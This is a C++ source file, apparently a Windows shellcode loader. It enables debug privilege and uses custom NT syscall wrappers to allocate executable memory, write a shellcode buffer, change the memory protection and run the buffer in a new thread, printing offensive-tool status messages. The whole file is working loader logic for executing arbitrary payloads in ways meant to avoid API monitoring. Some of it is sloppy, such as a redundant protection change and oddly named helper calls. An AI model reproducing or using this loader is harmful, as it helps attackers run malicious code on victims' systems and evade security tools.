#include "sq.h"

int main() {
    if (!EnableDebugPrivilege()) {
        std::cerr << "Failed to enable debug privilege." << std::endl;
        return 1;
    }
    Debug();
    if (!InitNtFunctions()) {
        printf("Failed to initialize NT functions\n");
        return 1;
    }
    Ntdl();

    processHandle = GetCurrentProcess();
    baseAddress = NULL;
    regionSize = sizeof(shellcode);
    allocationType = MEM_COMMIT | MEM_RESERVE;
    protect = PAGE_EXECUTE_READWRITE;

    NtVirt();
    Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect);

    printf("  [*] Allocated %zu bytes of memory at 0x%p\n", regionSize, baseAddress);

    NtWrite();
    Sq_WriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode written to allocated memory\n");

    NtProtect();

    protect = PAGE_EXECUTE_READWRITE;
    Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect);

    PageMemR();
    NtThread();

    Sq_CreateThreadEx(threadHandle, processHandle, baseAddress);

    ThdxSc();

    NtObjcect();
    Sq_WaitForSingleObject(threadHandle);

    printf("  [*] Shellcode execution complete\n");
    Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize);

    NtFreeMemory();
    FredMem();
    Ntcose();

    Sq_Close(processHandle);
    printf("  [+] Handles closed\n");

    return 1;
   
}
